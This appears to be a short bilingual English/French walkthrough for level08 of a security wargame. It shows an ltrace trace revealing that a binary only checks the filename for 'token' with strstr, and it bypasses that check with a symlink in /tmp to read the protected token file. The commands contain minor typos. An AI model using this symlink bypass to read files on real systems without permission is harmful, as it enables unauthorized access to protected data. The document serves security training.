### English

The only protection to open the file is a strstr.
```
ltrace ./token lol
strstr("lol", "token")                                                                 = nil
```

So we have to send the same file name. For this we use symbolic links.
- `ln -s /home/user/levl08/token /tmp/lol'
- `./level08 /tmp/lol`

### Francais

La seul protection pour ouvrir le fichier est un strstr:
```
ltrace ./token lol
strstr("lol", "token")                                                                 = nil
```

Nous devons donc envoyer le meme nom de fichier. Pour ca nous utilisons les liens symbolique.
- `ln -s /home/user/levl08/token /tmp/lol'
- `./level08 /tmp/lol`